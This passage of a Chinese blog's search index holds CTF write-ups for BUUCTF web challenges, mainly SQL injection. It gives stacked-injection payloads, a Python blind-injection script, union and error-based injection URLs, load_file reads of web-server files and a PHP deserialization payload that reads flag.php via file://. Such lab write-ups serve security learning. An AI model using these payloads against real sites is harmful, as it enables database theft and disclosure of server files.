class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> buuctf </tag>
            
            <tag> 代码注入 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题-sql注入篇</title>
      <link href="2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要记录了buuctf上web部分sql注入类型题目的writeup！持续更新！</p><a id="more"></a><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>可以看到过滤了很多东西</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/过滤.png" style="zoom: 67%;"><p>这题考察的是堆叠注入，因此我们可以先查询下数据库</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/数据库.png" style="zoom: 67%;"><p>不绕弯子，flag在supersqli里的1919810931114514表里，现在有两种方法可以得到flag</p><h4 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h4><p>使用prepare和execute来构造语句从而绕过过滤，payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=<span class="number">1</span><span class="string">&#x27;%3BSet%40a%3D0x73656c656374202a2066726f6d20603139313938313039333131313435313460%3Bprepare+b+from+%40a%3Bexecute+b%3B%23</span></span><br></pre></td></tr></table></figure><p>url解码后是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare b from @a;execute b;#</span></span><br></pre></td></tr></table></figure><p>其中那段16进制字符串的意思是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span></span><br></pre></td></tr></table></figure><p>类似的payload还有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;use supersqli;set @sql=concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect `flag` <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span></span><br></pre></td></tr></table></figure><h4 id="方式2"><a href="#方式2" class="headerlink" title="方式2"></a>方式2</h4><p>这种思路算是骚套路了</p><p>题目环境用的数据库和flag所在的数据库一样，都是supersqli，只不过两个表不同，因此我们可以改下表的名字，先看下表的结构</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;use supersqli;show tables;show columns from `1919810931114514`;#</span></span><br><span class="line"><span class="string">1&#x27;</span>;<span class="keyword">use</span> <span class="title">supersqli</span>;show tables;show columns <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/数字表结构.png" style="zoom:67%;"><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200114165010.png" style="zoom:67%;"><p>发现数字表只有flag这一列，而题目所使用的表有id,data两列，因此我们可以往数字表里插入一个名为id的列，然后将flag列重新命名为data，再将数字表名改为words，把words表改成其它名称，payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`test666`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> <span class="keyword">id</span> <span class="built_in">INT</span>(<span class="number">11</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200114171454.png" style="zoom:67%;"><p>注意数字表要加反引号，id因为是刚插入的，应该为空，所以需要加个<code>or 1=1#</code></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>同样是堆叠注入，按照以前的思路发现能注出数据库为ctf，表为Flag，字段就没办法了</p><p>不绕弯子，后台sql语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_POST[<span class="string">&#x27;query&#x27;</span>]||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><p>解题payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><p>相当于执行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200213135340.png" style="zoom: 80%;"><p><code>sql_modesql_mode</code>：是一组mysql支持的基本语法及校验规则，<code>PIPES_AS_CONCAT</code>：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p><p>还有个payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure><p>相当于执行:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200213135531.png" style="zoom:80%;"><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>打开题目提示flag在flag表flag字段里，bool盲注，exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://fea4ab1f-7bf4-452f-9c2a-83dadf6f6315.node3.buuoj.cn&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">f1=flag</span><br><span class="line">top=<span class="number">127</span></span><br><span class="line">low=<span class="number">33</span></span><br><span class="line"><span class="keyword">while</span> low&lt;=top:</span><br><span class="line">mid=(top+low)//<span class="number">2</span></span><br><span class="line">data=&#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">data1=&#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r1=requests.post(url,data=data1)</span><br><span class="line">print(i,mid)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;glzjin&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">flag+=chr(mid)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">top=mid<span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;glzjin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">low=mid+<span class="number">1</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> flag==f1:</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>还有种payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1^(if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;100,1,0))</span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="writeup-3"><a href="#writeup-3" class="headerlink" title="writeup"></a>writeup</h3><p>扫目录，发现<code>flag.php</code>和<code>robots.txt</code>，访问看到<code>user.php.bak</code>，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便注册个账号进去，在<code>view.php?no=</code>发现存在注入</p><p><code>order by</code> 判断出有四列，试了试联合查询，发现直接<code>union select</code>被waf拦了</p><p>尝试 <code>union/**/select</code>发现可以成功绕过，判断回显位，发现是第二位</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406104336.png" style="zoom:80%;"><p>接着就是爆数据库，表，列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata%<span class="number">23</span></span><br><span class="line"><span class="comment"># 得到fakebook,information_schema,mysql,performance_schema,test</span></span><br><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables where table_schema=database()%<span class="number">23</span></span><br><span class="line"><span class="comment"># 得到users</span></span><br><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema=database()%<span class="number">23</span></span><br><span class="line"><span class="comment"># 得到no,username,passwd,data </span></span><br><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,concat(no,<span class="string">&#x27; &#x27;</span>,username,<span class="string">&#x27; &#x27;</span>,passwd,<span class="string">&#x27; &#x27;</span>,data),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> fakebook.users where no=<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>发现用16进制分割的时候会被waf拦，直接用空格字符串</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406110341.png" style="zoom:80%;"><p>发现最后一列的值是序列化的结果，应该和前面的源码泄露有关</p><p>注入这里也可以用报错注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,database()))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database())))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_schema=database() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(select group_concat(data) <span class="keyword">from</span> fakebook.users where no=<span class="number">1</span>)))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>在爆内容的时候发现不全，这是因为报错注入长度限制，默认为32个字符，我们先用length爆一下长度，再用left,right,reverse来看到全部内容</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200406112742.png"></p><p>看其他大佬的操作，还可以用make_set函数，之前没用过，这里记一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">&#x27;~&#x27;</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database())),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment"># 回显前两列</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406113240.png" style="zoom:80%;"><p>详细可以看：<a href="https://blog.csdn.net/qq_41725312/article/details/83039525">https://blog.csdn.net/qq_41725312/article/details/83039525</a></p><p>题目可以直接load_file读文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,load_file(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>),<span class="number">3</span>,<span class="number">4</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>直接读<code>flag.php</code>可以得到flag</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200406113721.png"></p><p>读<code>index.php</code>发现存在反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> ($db-&gt;getAllUsers() <span class="keyword">as</span> $user)</span><br><span class="line">&#123;</span><br><span class="line">$data = unserialize($user[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$user[&#x27;no&#x27;]&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;a href=&#x27;view.php?no=<span class="subst">&#123;$user[&#x27;no&#x27;]&#125;</span>&#x27;&gt;<span class="subst">&#123;$user[&#x27;username&#x27;]&#125;</span>&lt;/a&gt;&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$data-&gt;age&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$data-&gt;blog&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着我们又在<code>view.php</code>发现存在和上面一样的反序列化，并调用了user类里的getBlogContents方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$no = $_GET[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($db-&gt;anti_sqli($no))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$res = $db-&gt;getUserByNo($no);</span><br><span class="line">$user = unserialize($res[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$response = $user-&gt;getBlogContents();</span><br><span class="line"><span class="keyword">if</span> ($response === <span class="number">404</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$base64 = base64_encode($response);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// echo $response;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>捋下思路，index.php会获取所有用户，并把数据库中data字段反序列化，view.php会访问之前留的blog链接的内容，而在index.php那里存在正则过滤，我们无法在blog插入<code>file://</code>协议读源码的代码，但在view.php并不存在过滤，并且此处存在sql注入，所以我们可以直接union一个假的用户,data在第四个字段上</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> UserInfo());</span><br></pre></td></tr></table></figure><p>请求带上，注意序列化字符串要加上引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406122033.png" style="zoom:80%;"><p>查看源代码，点data协议就行</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200406122146.png"></p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><h3 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h3><p>扫目录，发现git源码泄露，git_extract恢复，得到<code>write_do.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span 